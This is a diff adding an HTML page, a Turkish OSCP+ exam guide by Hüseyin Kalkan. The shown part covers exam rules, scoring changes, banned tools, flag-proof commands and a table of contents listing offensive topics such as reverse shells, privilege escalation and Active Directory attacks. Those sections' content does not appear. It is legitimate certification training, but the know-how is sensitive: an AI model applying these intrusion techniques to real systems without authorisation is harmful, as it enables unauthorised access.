@@ -1,0 +1,2346 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OSCP Ultimate Guide — OSCP+ Sınav Rehberi | Hüseyin Kalkan</title>
+<meta name="description" content="OSCP+ sınavı için kapsamlı ve etkileşimli Türkçe rehber: sınav kuralları ve puanlama, strateji ve zaman yönetimi, keşif, web, Active Directory ve yetki yükseltme metodolojisi, kopyalanabilir komutlar.">
+<meta name="author" content="Hüseyin Kalkan">
+<meta name="theme-color" content="#fbfaf8">
+<link rel="canonical" href="https://huseyinkalkan.net/oscp-ultimate-guide/">
+<link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="huseyinkalkan.net">
+<meta property="og:title" content="OSCP Ultimate Guide — OSCP+ Sınav Rehberi">
+<meta property="og:description" content="OSCP+ sınavı için kapsamlı ve etkileşimli Türkçe rehber.">
+<meta property="og:url" content="https://huseyinkalkan.net/oscp-ultimate-guide/">
+<meta property="og:locale" content="tr_TR">
+<meta name="twitter:card" content="summary">
+<style>
+:root{
+  --bg:#fbfaf8; --panel:#f2f0ec; --text:#1d1d1f; --muted:#5f5f66; --line:#dddad3;
+  --accent:#b4361f; --accent-soft:#f6e3de; --code-bg:#1e1f24; --code-text:#e6e6e6;
+  --ph:#ffcf5c; --tip:#e7f2ea; --tip-line:#2f7d4f; --warn:#fff4dc; --warn-line:#b07a00;
+  --danger:#fbe7e5; --danger-line:#b4361f;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#16171b; --panel:#1d1f24; --text:#e8e6e3; --muted:#a3a3ab; --line:#2e3037;
+    --accent:#ff7a5c; --accent-soft:#3a221d; --code-bg:#0f1013; --code-text:#e6e6e6;
+    --tip:#16271d; --tip-line:#4fbf7f; --warn:#2c2512; --warn-line:#e0b040;
+    --danger:#2e1a18; --danger-line:#ff7a5c;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#16171b; --panel:#1d1f24; --text:#e8e6e3; --muted:#a3a3ab; --line:#2e3037;
+  --accent:#ff7a5c; --accent-soft:#3a221d; --code-bg:#0f1013; --code-text:#e6e6e6;
+  --tip:#16271d; --tip-line:#4fbf7f; --warn:#2c2512; --warn-line:#e0b040;
+  --danger:#2e1a18; --danger-line:#ff7a5c;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth; scroll-padding-top:16px}
+body{margin:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.6 "Inter","Segoe UI",system-ui,-apple-system,sans-serif}
+code,pre{font-family:"JetBrains Mono","Fira Code","DejaVu Sans Mono",ui-monospace,monospace}
+a{color:var(--accent)}
+.layout{display:grid;grid-template-columns:300px minmax(0,1fr);min-height:100vh}
+nav.side{position:sticky;top:0;height:100vh;overflow:auto;background:var(--panel);
+  border-right:1px solid var(--line);padding:20px 16px 40px;font-size:13.5px}
+nav.side .brand{font-weight:700;font-size:16px;margin-bottom:2px}
+nav.side .sub{color:var(--muted);font-size:12px;margin-bottom:14px}
+nav.side ul{list-style:none;margin:0;padding:0}
+nav.side > .toc > ul > li{margin:10px 0 2px}
+nav.side > .toc > ul > li > a{font-weight:650;color:var(--text)}
+nav.side ul ul{padding-left:10px;border-left:1px solid var(--line);margin:4px 0 0 2px}
+nav.side ul ul a{color:var(--muted)}
+nav.side a{text-decoration:none;display:block;padding:2px 6px;border-radius:5px}
+nav.side a:hover,nav.side a.active{background:var(--accent-soft);color:var(--accent)}
+.tools{display:grid;gap:8px;margin-bottom:14px}
+.tools label{font-size:11.5px;color:var(--muted);display:block;margin-bottom:2px}
+.tools input{width:100%;padding:7px 9px;border:1px solid var(--line);border-radius:7px;
+  background:var(--bg);color:var(--text);font:13px "JetBrains Mono",monospace}
+.tools .row{display:flex;gap:6px}
+.tools button{flex:1;padding:6px;border:1px solid var(--line);border-radius:7px;background:var(--bg);
+  color:var(--text);cursor:pointer;font-size:12px}
+main{padding:36px clamp(16px,5vw,64px) 80px;max-width:1100px}
+header.hero{border-bottom:2px solid var(--accent);padding-bottom:18px;margin-bottom:10px}
+header.hero h1{font-size:34px;margin:0 0 6px;letter-spacing:-.5px}
+header.hero p{margin:0;color:var(--muted)}
+h1{font-size:27px;margin:56px 0 12px;padding-top:8px;border-top:1px solid var(--line);letter-spacing:-.3px}
+h2{font-size:20px;margin:34px 0 10px}
+h3{font-size:16.5px;margin:22px 0 8px}
+p,li{max-width:80ch}
+table{border-collapse:collapse;width:100%;margin:12px 0 18px;font-size:14px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:6px 10px;text-align:left;vertical-align:top}
+th{background:var(--panel);font-weight:650}
+td code,li code,p code{background:var(--panel);padding:1px 5px;border-radius:4px;font-size:.88em;word-break:break-word}
+.codewrap{position:relative;margin:10px 0 16px}
+pre{background:var(--code-bg);color:var(--code-text);padding:14px 16px;border-radius:9px;overflow-x:auto;
+  font-size:13px;line-height:1.5;margin:0}
+pre code{background:none;padding:0}
+.copy{position:absolute;top:7px;right:7px;font-size:11.5px;padding:3px 9px;border-radius:6px;
+  border:1px solid #444;background:#2b2d33;color:#ddd;cursor:pointer;opacity:.75}
+.copy:hover{opacity:1}
+.ph{color:var(--ph);font-weight:600}
+.admonition{border-left:4px solid var(--tip-line);background:var(--tip);padding:10px 14px;border-radius:7px;margin:14px 0}
+.admonition.warning{border-color:var(--warn-line);background:var(--warn)}
+.admonition.danger{border-color:var(--danger-line);background:var(--danger)}
+.admonition-title{font-weight:700;margin:0 0 4px}
+.admonition p{margin:4px 0}
+blockquote{border-left:4px solid var(--accent);margin:24px 0;padding:6px 16px;color:var(--muted);font-style:italic}
+hr{border:0;margin:0}
+.hidden{display:none!important}
+#menu{display:none}
+@media (max-width:900px){
+  .layout{display:block}
+  nav.side{position:fixed;inset:0 25% 0 0;z-index:10;transform:translateX(-105%);transition:transform .2s;height:100vh}
+  nav.side.open{transform:none;box-shadow:0 0 40px #0006}
+  #menu{display:block;position:fixed;right:14px;bottom:14px;z-index:11;padding:10px 14px;border-radius:999px;
+    border:1px solid var(--line);background:var(--accent);color:#fff;font-weight:650}
+  main{padding-top:20px}
+}
+@media print{
+  nav.side,#menu,.copy{display:none!important}
+  .layout{display:block}
+  main{max-width:none;padding:0}
+  body{background:#fff;color:#000;font-size:10.5pt}
+  pre{white-space:pre-wrap;word-break:break-all;background:#f4f4f4;color:#000;border:1px solid #ccc;font-size:8.5pt}
+  .ph{color:#000;text-decoration:underline}
+  h1{page-break-before:always;border-top:0;margin-top:0}
+  header.hero + h1{page-break-before:avoid}
+  h1,h2,h3{page-break-after:avoid}
+  pre,table,.admonition{page-break-inside:avoid}
+  table{display:table}
+  a{color:#000;text-decoration:none}
+}
+.backsite{display:inline-block;margin-bottom:10px;font-size:.82rem;font-weight:600;
+  color:var(--muted);text-decoration:none;border:1px solid var(--line);
+  border-radius:999px;padding:4px 11px;transition:color .15s,border-color .15s}
+.backsite:hover{color:var(--accent);border-color:var(--accent)}
+</style>
+</head>
+<body>
+<div class="layout">
+<nav class="side" id="side">
+  <a class="backsite" href="/">&larr; huseyinkalkan.net</a>
+  <div class="brand">OSCP+ Sınav Rehberi</div>
+  <div class="sub">v2.1 · kurallar 31.10.2026 itibarıyla doğrulandı</div>
+  <div class="tools">
+    <div><label for="lhost">LHOST (hedefe yapıştırılan komutlarda yerine konur)</label>
+      <input id="lhost" placeholder="ör. 192.168.45.201" autocomplete="off"></div>
+    <div><label for="q">Ara (bölüm filtrele)</label><input id="q" placeholder="kerberoast, suid, chisel…" autocomplete="off"></div>
+    <div class="row"><button id="theme" type="button">Tema</button><button type="button" onclick="window.print()">Yazdır / PDF</button></div>
+  </div>
+  <div class="toc"><div class="toc">
+<ul>
+<li><a href="#0-bu-belge-nasıl-kullanılır">0. Bu belge nasıl kullanılır</a></li>
+<li><a href="#1-oscp-sınav-kuralları-ve-puanlama">1. OSCP+ sınav kuralları ve puanlama</a><ul>
+<li><a href="#11-sınav-yapısı">1.1 Sınav yapısı</a></li>
+<li><a href="#12-70-puanın-matematiği-30-kasım-2026ya-kadarki-sınavlar">1.2 70 puanın matematiği (30 Kasım 2026'ya kadarki sınavlar)</a></li>
+<li><a href="#13-yasaklar-ve-kısıtlamalar-puanını-sıfırlayabilecek-şeyler">1.3 Yasaklar ve kısıtlamalar (puanını sıfırlayabilecek şeyler)</a></li>
+<li><a href="#14-puanın-verilme-koşulları">1.4 Puanın verilme koşulları</a></li>
+<li><a href="#15-sık-yapılan-puan-kaybı-hataları">1.5 Sık yapılan puan kaybı hataları</a></li>
+</ul>
+</li>
+<li><a href="#2-strateji-zaman-ve-not-disiplini">2. Strateji, zaman ve not disiplini</a><ul>
+<li><a href="#21-zaman-planı-0900-başlangıç-örneği">2.1 Zaman planı (09:00 başlangıç örneği)</a></li>
+<li><a href="#22-ortam-kurulumu-bir-kez">2.2 Ortam kurulumu (bir kez)</a></li>
+<li><a href="#23-not-şablonu-her-hedef-için-kopyala">2.3 Not şablonu (her hedef için kopyala)</a></li>
+<li><a href="#otuz-dakika">2.4 30 dakika kuralı (kilitlenme protokolü)</a></li>
+<li><a href="#25-kimlik-bilgisi-yeniden-kullanım-matrisi">2.5 Kimlik bilgisi yeniden kullanım matrisi</a></li>
+</ul>
+</li>
+<li><a href="#3-keşif-ve-servis-enumerasyonu">3. Keşif ve servis enumerasyonu</a><ul>
+<li><a href="#31-nmap-tek-akış">3.1 Nmap — tek akış</a></li>
+<li><a href="#32-port-ilk-yapılacaklar">3.2 Port → ilk yapılacaklar</a></li>
+<li><a href="#33-ftp-21">3.3 FTP (21)</a></li>
+<li><a href="#34-smb-rpc-139-445">3.4 SMB / RPC (139, 445)</a></li>
+<li><a href="#35-snmp-161udp">3.5 SNMP (161/udp)</a></li>
+<li><a href="#36-ldap-kerberos-389-88">3.6 LDAP / Kerberos (389, 88)</a></li>
+<li><a href="#37-nfs-smtp-dns-veritabanları-redis">3.7 NFS, SMTP, DNS, veritabanları, Redis</a></li>
+</ul>
+</li>
+<li><a href="#4-web-uygulamaları">4. Web uygulamaları</a><ul>
+<li><a href="#41-web-öncelik-sırası">4.1 Web öncelik sırası</a></li>
+<li><a href="#42-i̇çerik-ve-vhost-keşfi">4.2 İçerik ve vhost keşfi</a></li>
+<li><a href="#43-varsayılan-kimlik-bilgileri">4.3 Varsayılan kimlik bilgileri</a></li>
+<li><a href="#44-sql-injection-manuel-sqlmap-sınavda-yasak">4.4 SQL Injection (manuel — sqlmap sınavda yasak)</a></li>
+<li><a href="#45-directory-traversal-lfi-rfi">4.5 Directory traversal / LFI / RFI</a></li>
+<li><a href="#46-dosya-yükleme-bypass">4.6 Dosya yükleme bypass</a></li>
+<li><a href="#47-komut-enjeksiyonu">4.7 Komut enjeksiyonu</a></li>
+<li><a href="#48-ssti">4.8 SSTI</a></li>
+<li><a href="#49-xss-xxe-ssrf-kısa">4.9 XSS, XXE, SSRF (kısa)</a></li>
+<li><a href="#410-bilinen-uygulamalar-ve-klasik-cveler">4.10 Bilinen uygulamalar ve klasik CVE'ler</a></li>
+<li><a href="#411-exploit-bulma-ve-uyarlama">4.11 Exploit bulma ve uyarlama</a></li>
+<li><a href="#412-i̇stemci-tarafı-saldırılar-e-posta-phishing-senaryosu">4.12 İstemci tarafı saldırılar (e-posta / phishing senaryosu)</a></li>
+</ul>
+</li>
+<li><a href="#5-parolalar-ve-hashler">5. Parolalar ve hash'ler</a><ul>
+<li><a href="#51-brute-force-ve-spray">5.1 Brute force ve spray</a></li>
+<li><a href="#52-hash-türleri">5.2 Hash türleri</a></li>
+<li><a href="#53-dosya-parolaları-2john">5.3 Dosya parolaları (*2john)</a></li>
+</ul>
+</li>
+<li><a href="#6-kabuklar-shell">6. Kabuklar (shell)</a><ul>
+<li><a href="#61-reverse-shell-kataloğu">6.1 Reverse shell kataloğu</a></li>
+<li><a href="#62-msfvenom-her-makinede-serbest-meterpreter-hariç">6.2 msfvenom (her makinede serbest — Meterpreter hariç)</a></li>
+<li><a href="#63-linux-tty-yükseltme">6.3 Linux TTY yükseltme</a></li>
+<li><a href="#64-windowsta-daha-iyi-kabuk">6.4 Windows'ta daha iyi kabuk</a></li>
+<li><a href="#65-reverse-shell-gelmiyorsa">6.5 Reverse shell gelmiyorsa</a></li>
+</ul>
+</li>
+<li><a href="#7-dosya-transferi">7. Dosya transferi</a><ul>
+<li><a href="#71-kali-tarafında-sunucular-tmux-pencere-0da-sürekli-açık">7.1 Kali tarafında sunucular (tmux pencere 0'da sürekli açık)</a></li>
+<li><a href="#72-kali-hedef">7.2 Kali → hedef</a></li>
+<li><a href="#73-hedef-kali">7.3 Hedef → Kali</a></li>
+</ul>
+</li>
+<li><a href="#8-linux-yetki-yükseltme">8. Linux yetki yükseltme</a><ul>
+<li><a href="#81-sıralı-kontrol-listesi-önce-manuel-5-dk-sonra-linpeas">8.1 Sıralı kontrol listesi (önce manuel 5 dk, sonra linpeas)</a></li>
+<li><a href="#82-sudo">8.2 sudo</a></li>
+<li><a href="#83-suid-ve-capabilities">8.3 SUID ve capabilities</a></li>
+<li><a href="#84-cron-ve-zamanlanmış-işler">8.4 Cron ve zamanlanmış işler</a></li>
+<li><a href="#85-gruplar">8.5 Gruplar</a></li>
+<li><a href="#86-nfs-no_root_squash">8.6 NFS no_root_squash</a></li>
+<li><a href="#87-kernel-ve-bilinen-yerel-cveler-son-çare">8.7 Kernel ve bilinen yerel CVE'ler (son çare)</a></li>
+<li><a href="#linux-karar">8.8 Linux privesc karar tablosu</a></li>
+</ul>
+</li>
+<li><a href="#9-windows-yetki-yükseltme">9. Windows yetki yükseltme</a><ul>
+<li><a href="#91-sıralı-kontrol-listesi">9.1 Sıralı kontrol listesi</a></li>
+<li><a href="#92-kimlik-bilgisi-avı-windowsta-en-verimli-privesc">9.2 Kimlik bilgisi avı (Windows'ta en verimli privesc)</a></li>
+<li><a href="#93-servisler">9.3 Servisler</a></li>
+<li><a href="#94-zamanlanmış-görevler-ve-alwaysinstallelevated">9.4 Zamanlanmış görevler ve AlwaysInstallElevated</a></li>
+<li><a href="#95-yetkiler-whoami-priv">9.5 Yetkiler (whoami /priv)</a></li>
+<li><a href="#96-gruplar">9.6 Gruplar</a></li>
+<li><a href="#97-uac-bypass-administrators-üyesi-medium-integrity">9.7 UAC bypass (Administrators üyesi + Medium integrity)</a></li>
+<li><a href="#98-adminsystem-olduktan-sonra-sadece-flag-değil">9.8 Admin/SYSTEM olduktan sonra (sadece flag değil!)</a></li>
+<li><a href="#99-eski-yamasız-sistemler">9.9 Eski / yamasız sistemler</a></li>
+<li><a href="#windows-karar">9.10 Windows privesc karar tablosu</a></li>
+<li><a href="#911-hızlı-referans-ilk-10-dakika">9.11 Hızlı referans: ilk 10 dakika</a></li>
+</ul>
+</li>
+<li><a href="#10-active-directory-varsayılan-ihlal-senaryosu">10. Active Directory (varsayılan ihlal senaryosu)</a><ul>
+<li><a href="#ad-karar">10.1 AD karar ağacı</a></li>
+<li><a href="#102-i̇lk-15-dakika">10.2 İlk 15 dakika</a></li>
+<li><a href="#103-bloodhound">10.3 BloodHound</a></li>
+<li><a href="#104-powerview-yerleşik-araçlarla-enum-hedef-üzerinden">10.4 PowerView / yerleşik araçlarla enum (hedef üzerinden)</a></li>
+<li><a href="#105-kerberoasting-ve-as-rep-roasting">10.5 Kerberoasting ve AS-REP roasting</a></li>
+<li><a href="#106-yatay-hareket">10.6 Yatay hareket</a></li>
+<li><a href="#107-mssql">10.7 MSSQL</a></li>
+<li><a href="#108-acl-istismarı-bloodhound-kenarları">10.8 ACL istismarı (BloodHound kenarları)</a></li>
+<li><a href="#109-domain-admin-ve-kanıt">10.9 Domain Admin ve kanıt</a></li>
+<li><a href="#1010-i̇leri-seviye-pen-200-müfredatı-dışı-sadece-kısa-not">10.10 İleri seviye (PEN-200 müfredatı dışı — sadece kısa not)</a></li>
+<li><a href="#1011-adde-sık-yapılan-hatalar">10.11 AD'de sık yapılan hatalar</a></li>
+</ul>
+</li>
+<li><a href="#11-pivoting">11. Pivoting</a><ul>
+<li><a href="#111-ne-zaman">11.1 Ne zaman</a></li>
+<li><a href="#112-ligolo-ng-önerilen-proxychains-gerektirmez">11.2 Ligolo-ng (önerilen — proxychains gerektirmez)</a></li>
+<li><a href="#113-chisel-socks-proxychains">11.3 Chisel (SOCKS + proxychains)</a></li>
+<li><a href="#114-ssh">11.4 SSH</a></li>
+<li><a href="#115-windows-yerleşik-araç-taşıyamıyorsan">11.5 Windows yerleşik / araç taşıyamıyorsan</a></li>
+</ul>
+</li>
+<li><a href="#12-rapor">12. Rapor</a><ul>
+<li><a href="#121-teslim-kuralları">12.1 Teslim kuralları</a></li>
+<li><a href="#122-yapı">12.2 Yapı</a></li>
+<li><a href="#123-her-adım-için-kalıp">12.3 Her adım için kalıp</a></li>
+<li><a href="#124-24-saatlik-rapor-planı">12.4 24 saatlik rapor planı</a></li>
+</ul>
+</li>
+<li><a href="#ekler">Ekler</a><ul>
+<li><a href="#ek-a-sınav-günü-tek-sayfa">Ek A — Sınav günü tek sayfa</a></li>
+<li><a href="#ek-b-hızlı-kanıt-komutları">Ek B — Hızlı kanıt komutları</a></li>
+<li><a href="#ek-c-kaynaklar">Ek C — Kaynaklar</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<header class="hero">
+  <h1 style="border:0;margin:0 0 6px;padding:0">OSCP+ Sınav Rehberi</h1>
+  <p>Kurallar · Strateji · Keşif · Web · Parolalar · Kabuklar · Transfer · Linux/Windows privesc · Active Directory · Pivoting · Rapor</p>
+</header>
+<h1 id="0-bu-belge-nasıl-kullanılır">0. Bu belge nasıl kullanılır</h1>
+<p>Üç kullanım modu var:</p>
+<ol>
+<li><strong>Sınavdan önce:</strong> Bölüm 1–2'yi baştan sona oku (kurallar + strateji). Diğer bölümlerde bilmediğin her komutu bir lab makinesinde en az bir kez çalıştır — sınavda ilk kez denenen komut, çalışmayan komuttur.</li>
+<li><strong>Sınav sırasında:</strong> Bölüm 3–11 kopyala-yapıştır içindir. Her kod bloğunun sağ üstünde <strong>Kopyala</strong> düğmesi var.</li>
+<li><strong>Takıldığında:</strong> <a href="#otuz-dakika">30 dakika kuralı</a>, <a href="#linux-karar">Linux karar tablosu</a>, <a href="#windows-karar">Windows karar tablosu</a> ve <a href="#ad-karar">AD karar ağacı</a>.</li>
+</ol>
+<p><strong>Değişkenler.</strong> Bütün komutlar aşağıdaki değişkenleri kullanır; sabit IP yoktur. Her yeni hedefte sadece <code>IP</code>'yi değiştir.</p>
+<pre><code class="language-bash"># ~/exam/vars.sh  →  her tmux penceresinde:  source ~/exam/vars.sh
+export LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)   # senin VPN IP'n
+export LPORT=443
+export IP=192.168.x.x                 # o anki hedef
+export DC=10.10.x.x DOMAIN=corp.local USER=user PASS='Passw0rd!'
+</code></pre>
+<p>Hedef tarafında (Windows/Linux kabuğunda) değişken yoktur: oraya yapıştıracağın komutlarda <code>LHOST</code> geçen yerleri kendi IP'nle değiştir. Açılı ayraçlı her şey (<code>&lt;NTLM&gt;</code>, <code>&lt;PID&gt;</code>) elle doldurulur.</p>
+<hr />
+<h1 id="1-oscp-sınav-kuralları-ve-puanlama">1. OSCP+ sınav kuralları ve puanlama</h1>
+<div class="admonition danger">
+<p class="admonition-title">Kurallar değişir — sınavdan önce resmi kılavuzu oku</p>
+<p>Bu bölüm 31 Ekim 2026'da resmi <strong>OSCP+ Exam Guide</strong> (help.offsec.com, aynı gün güncellenmiş sürüm), <strong>OSCP+ Scoring Update</strong> blog yazısı ve <strong>Equated Scaled Scoring FAQ</strong> ile karşılaştırılarak doğrulandı. OffSec kuralları sık günceller: sınavdan 1 hafta önce bu sayfaları yeniden oku. Bu belge ile çelişirse resmi kılavuz geçerlidir.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">1 Aralık 2026'dan itibaren puanlama değişiyor</p>
+<p><strong>1 Aralık 2026 08:00 GMT ve sonrasında başlayan</strong> sınavlarda <em>equated scaled scoring</em> kullanılıyor. OffSec'e göre artık "70 puanı ya da başka herhangi bir ham puanı geçme hedefi olarak kullanmamalısın"; ham puan tek başına geçip geçmediğini belirlemez. Sonuç notlandırmadan sonra bildirilir. Yayımlanmış sayısal bir geçme eşiği yok (internette dolaşan "500 üzerinden 400" gibi rakamlar resmi değil). Sınav içeriği, makine yapısı, süre, kanıt ve rapor kuralları <strong>değişmiyor</strong>.
+<strong>30 Kasım 2026'ya kadar</strong> girilen sınavlarda eski kural geçerli: 100 üzerinden 70. 1 Aralık'tan önce planlanmış bir sınavı o tarihten sonraya ertelersen yeni yöntemle puanlanırsın. Pratik sonuç: iki durumda da hedef aynı — <strong>olabildiğince çok makine + kusursuz rapor</strong>, ve puanın yettiğini düşünsen bile raporu mutlaka gönder.</p>
+</div>
+<h2 id="11-sınav-yapısı">1.1 Sınav yapısı</h2>
+<table>
+<thead>
+<tr>
+<th>Kalem</th>
+<th>Değer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Süre</td>
+<td>23 saat 45 dakika (gözetmenli)</td>
+</tr>
+<tr>
+<td>Rapor</td>
+<td>Sınav bittikten sonra ayrıca 24 saat</td>
+</tr>
+<tr>
+<td>Bağımsız makine</td>
+<td>3 adet × 20 puan (10 local.txt + 10 proof.txt)</td>
+</tr>
+<tr>
+<td>AD seti</td>
+<td>3 makine = 40 ham puan (makine #1: 10, #2: 10, #3: 20)</td>
+</tr>
+<tr>
+<td>AD başlangıcı</td>
+<td><strong>Varsayılan ihlal (assumed breach):</strong> bir kullanıcı adı + parola verilir</td>
+</tr>
+<tr>
+<td>Toplam / geçme</td>
+<td>100 ham puan. <strong>30 Kasım 2026'ya kadar:</strong> 70 ile geçilir. <strong>1 Aralık 2026'dan itibaren:</strong> ölçekli puanlama, sabit ham puan eşiği yok (yukarıdaki uyarı)</td>
+</tr>
+<tr>
+<td>Bonus puan</td>
+<td><strong>Yok.</strong> 1 Kasım 2024'te kaldırıldı.</td>
+</tr>
+<tr>
+<td>Revert</td>
+<td>Kontrol panelinden en fazla 24; sınav sırasında bir kez sıfırlatılabilir</td>
+</tr>
+<tr>
+<td>Kısmi puan</td>
+<td>Bağımsız makinelerde kılavuzda açıkça var (kısmi ve tam yetki). AD için kılavuz sadece makine başına puanı listeliyor; kısmi puanı ayrıca belirtmiyor</td>
+</tr>
+</tbody>
+</table>
+<h2 id="12-70-puanın-matematiği-30-kasım-2026ya-kadarki-sınavlar">1.2 70 puanın matematiği (30 Kasım 2026'ya kadarki sınavlar)</h2>
+<p>Bu tablo eski 70/100 kuralına göre. 1 Aralık 2026 ve sonrasında sabit bir eşik yok, ama tablo hangi kombinasyonların "güçlü" olduğunu göstermesi açısından yine de yol gösterir.</p>
+<p>Geçen kombinasyonlar (bonus yok):</p>
+<table>
+<thead>
+<tr>
+<th>Profil</th>
+<th>Hesap</th>
+<th>Toplam</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AD tam + 1,5 bağımsız</td>
+<td>40 + 20 + 10</td>
+<td><strong>70</strong> ✅</td>
+</tr>
+<tr>
+<td>AD tam + 2 bağımsız</td>
+<td>40 + 20 + 20</td>
+<td><strong>80</strong> ✅</td>
+</tr>
+<tr>
+<td>3 bağımsız tam + AD'de 1 makine</td>
+<td>60 + 10</td>
+<td><strong>70</strong> ✅</td>
+</tr>
+<tr>
+<td>3 bağımsız tam + AD'de 2 makine</td>
+<td>60 + 20</td>
+<td><strong>80</strong> ✅</td>
+</tr>
+<tr>
+<td>Sadece AD tam</td>
+<td>40</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>Sadece 3 bağımsız tam</td>
+<td>60</td>
+<td>❌</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Sonuç:</strong> Tek bir alanla geçilmez. En güvenli yol AD setini bitirmek ve üstüne en az 30 puan bağımsız makineden almaktır. Bağımsız makinelerde <strong>initial access (local.txt)</strong> genellikle privesc'ten kolaydır — üç makinenin üçünde de local.txt almak 30 puandır.</p>
+<h2 id="13-yasaklar-ve-kısıtlamalar-puanını-sıfırlayabilecek-şeyler">1.3 Yasaklar ve kısıtlamalar (puanını sıfırlayabilecek şeyler)</h2>
+<table>
+<thead>
+<tr>
+<th>Kural</th>
+<th>Pratikte anlamı</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Metasploit sadece 1 makinede</strong></td>
+<td><code>exploit</code>/<code>auxiliary</code>/<code>post</code> modülleri ve <strong>Meterpreter</strong> yalnızca seçtiğin tek bir hedefte. <strong><code>check</code> komutu da kullanım sayılır</strong> (önce hepsinde dene, sonra seç olmaz). Başladığın an o hedefe kilitlenirsin; saldırı başarısız olsa bile başka hedefte kullanamazsın. <strong>Metasploit ile pivot yapılamaz</strong> (birden fazla hedefte kullanım sayılır).</td>
+</tr>
+<tr>
+<td>msfvenom ve <code>multi/handler</code></td>
+<td>Her makinede serbest. Meterpreter payload'ı ise yukarıdaki tek-hedef kuralına tabi.</td>
+</tr>
+<tr>
+<td><strong>Otomatik sömürü araçları yasak</strong></td>
+<td><code>sqlmap</code>, sqlninja, db_autopwn, browser_autopwn vb. SQLi'yi <strong>manuel</strong> yapmayı bil.</td>
+</tr>
+<tr>
+<td>Toplu zafiyet tarayıcıları yasak</td>
+<td>Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT vb. Serbest örnekler: Nmap (NSE dahil), Nikto, Burp Free, DirBuster</td>
+</tr>
+<tr>
+<td>Yasaklı işlevi olan diğer araçlar</td>
+<td>Başka bir aracın yasaklı/kısıtlı işlevi kullanan özelliği de yasak (ör. bir aracın içindeki otomatik sömürü modülü)</td>
+</tr>
+<tr>
+<td><strong>Spoofing yasak</strong></td>
+<td>ARP / DNS / NBNS / LLMNR zehirleme. <strong>Responder ile poisoning yapma.</strong></td>
+</tr>
+<tr>
+<td>Ticari araçlar yasak</td>
+<td>Burp Suite <strong>Pro</strong>, Cobalt Strike, Metasploit Pro vb. Burp Community serbest.</td>
+</tr>
+<tr>
+<td><strong>AI / LLM yasak</strong></td>
+<td>OffSec KAI, ChatGPT, Deepseek, Gemini, Claude vb. "kesinlikle yasak" — <strong>rapor yazarken de</strong>. Notion, Google AI Overview gibi araçlardaki yerleşik AI özelliklerini kapatman gerekmiyor (ayrıntı: "AI Usage Policy in OffSec Exams").</td>
+</tr>
+<tr>
+<td>İletişim</td>
+<td>Başkasıyla konuşmak, forum/discord'a yazmak yasak.</td>
+</tr>
+</tbody>
+</table>
+<p>Bu tabloyla çelişen teknikler (sqlmap, Responder, Meterpreter'ın birden fazla makinede kullanımı) bu belgede ya hiç yer almaz ya da <strong>"sınavda yasak/kısıtlı"</strong> etiketiyle geçer.</p>
+<h2 id="14-puanın-verilme-koşulları">1.4 Puanın verilme koşulları</h2>
+<ul>
+<li><strong>local.txt / proof.txt hedef üzerinde etkileşimli bir kabukta</strong>, dosyanın <strong>kendi konumundan</strong> <code>cat</code> / <code>type</code> ile okunmalı. Başka yolla elde edilen kanıt o hedef için <strong>sıfır puan</strong> demektir — kılavuz açıkça <strong>"her tür web tabanlı shell"</strong>i de buna dahil ediyor (LFI/SQLi ile dosya okuma da geçmez).</li>
+<li>proof.txt için kabuk yetkisi: Linux'ta <strong>root</strong>, Windows'ta <strong>SYSTEM / Administrator / yönetici yetkili</strong> kullanıcı. proof.txt <code>/root/</code> ya da Administrator masaüstündedir; local.txt yetkisiz bir hesapla okunabilir.</li>
+<li>Ekran görüntüsünde flag içeriği + hedefin <strong>IP adresi</strong> (<code>ipconfig</code> / <code>ifconfig</code> / <code>ip addr</code>) zorunlu. Ekran görüntüsü yoksa o hedef için <strong>sıfır puan</strong>. (<code>whoami</code>/<code>id</code> ve hostname'i de eklemek kanıtı güçlendirir.)</li>
+<li><strong>Flag'i sınav bitmeden Exam Control Panel'e gir.</strong> Panel girdiğin değerin doğru olup olmadığını <strong>göstermez</strong> — kopyala-yapıştır hatasına dikkat.</li>
+<li>Her makinenin tam puan hedefleri kontrol panelinde yazar; sınav başında oku.</li>
+<li>Rapordaki adımlar, teknik bir okuyucunun adım adım tekrarlayabileceği kadar ayrıntılı olmalı. Kılavuz: "dokümantasyon gereksinimleri çok katıdır"; yetersiz dokümantasyon puanı düşürür ya da sıfırlar.</li>
+</ul>
+<p>Tek karede tüm kanıt:</p>
+<pre><code class="language-bash"># Linux
+hostname; id; ip a | grep inet; cat /root/proof.txt
+</code></pre>
+<pre><code class="language-powershell"># Windows (cmd)
+hostname &amp; whoami &amp; ipconfig | findstr IPv4 &amp; type C:\Users\Administrator\Desktop\proof.txt
+</code></pre>
+<h2 id="15-sık-yapılan-puan-kaybı-hataları">1.5 Sık yapılan puan kaybı hataları</h2>
+<ul>
+<li>Flag'i web shell'den okumak (etkileşimli kabuk değil).</li>
+<li>Ekran görüntüsünde IP/hostname yok.</li>
+<li>Flag'i panele girmeyi unutmak, ya da iki makinenin flag'ini karıştırmak (her flag'i hostname ile birlikte not et).</li>
+<li>Metasploit/Meterpreter'ı farkında olmadan ikinci bir makinede kullanmak.</li>
+<li>Exploit'i değiştirdiğin hâlde değişikliği rapora yazmamak (hangi satır, neden).</li>
+<li>Kontrol panelinin flag'i "doğruladığını" sanmak (doğrulamaz).</li>
+<li>Puanın yettiğini düşünüp raporu göndermemek (OffSec: puanın ne olursa olsun raporu gönder).</li>
+</ul>
+<hr />
+<h1 id="2-strateji-zaman-ve-not-disiplini">2. Strateji, zaman ve not disiplini</h1>
